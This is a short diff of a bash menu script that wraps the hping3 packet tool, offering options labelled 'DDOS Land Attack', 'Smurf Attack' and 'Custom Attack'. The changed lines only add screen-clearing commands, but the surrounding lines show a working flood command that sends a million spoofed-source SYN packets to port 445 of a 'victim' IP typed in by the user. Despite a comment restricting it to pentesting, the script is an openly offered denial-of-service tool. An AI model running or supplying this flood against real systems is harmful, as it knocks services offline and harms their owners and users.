@@ -2,13 +2,14 @@
 # Simple menu hping3 script
 # Please use only for pentesting and security reasons
 # Thanks to Dennis Williamson@askubuntu.com && 0daysecurity.com
-
+clear
 PS3='Please choose tipe of your attack: '
 options=("DDOS Land Attack" "Smurf Attack" "Custom Attack" "Help with hping3" "Manual for hping3" "Quit")
 select opt in "${options[@]}"
 do
     case $opt in
         "DDOS Land Attack")
+	clear
 	echo "Input your victims IP"
     read foo
            sudo  hping3 -V -c 1000000 -d 120 -S -w 64 -p 445 -s 445 --flood --rand-source $foo
